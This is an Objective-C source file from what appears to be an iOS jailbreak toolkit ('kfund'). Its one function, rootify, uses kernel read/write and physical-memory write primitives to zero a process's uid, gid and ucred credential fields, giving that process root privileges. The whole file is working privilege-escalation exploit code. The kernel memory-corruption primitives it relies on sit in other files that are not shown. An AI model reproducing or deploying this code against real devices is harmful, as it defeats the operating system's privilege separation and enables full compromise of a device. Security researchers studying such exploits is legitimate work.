//
//  escalate.m
//  kfund
//
//  Created by Seo Hyun-gyu on 1/3/24.
//

#import <Foundation/Foundation.h>
#import "offsets.h"
#import "proc.h"
#import "krw.h"
#import "jailbreak.h"
#import "kcall.h"

bool rootify(pid_t pid) {
    if (!pid) return false;

    uint64_t proc = proc_of_pid(pid);
    uint64_t proc_ro = kread64(proc + off_p_proc_ro);
    uint64_t ucred = kread64(proc_ro + off_p_ro_p_ucred);
    
    kwrite32(proc + off_p_uid, 0);
    kwrite32(proc + off_p_ruid, 0);
    kwrite32(proc + off_p_gid, 0);
    kwrite32(proc + off_p_rgid, 0);
    
    uint64_t cr_posix_p = kvtophys(ucred + off_u_cr_posix);
    physwrite32(cr_posix_p + off_cr_uid, 0);
    physwrite32(cr_posix_p + off_cr_ruid, 0);
    physwrite32(cr_posix_p + off_cr_svuid, 0);
    physwrite32(cr_posix_p + off_cr_ngroups, 1);
    physwrite32(cr_posix_p + off_cr_groups, 0);
    physwrite32(cr_posix_p + off_cr_rgid, 0);
    physwrite32(cr_posix_p + off_cr_svgid, 0);
    
    return (kread32(proc + off_p_uid) == 0) ? true : false;
    return false;
}
